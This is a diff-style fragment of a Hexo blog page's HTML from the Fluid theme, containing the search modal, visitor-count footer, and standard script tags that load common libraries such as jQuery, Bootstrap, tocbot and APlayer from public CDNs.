+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script>
+<script src="/js/reward.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
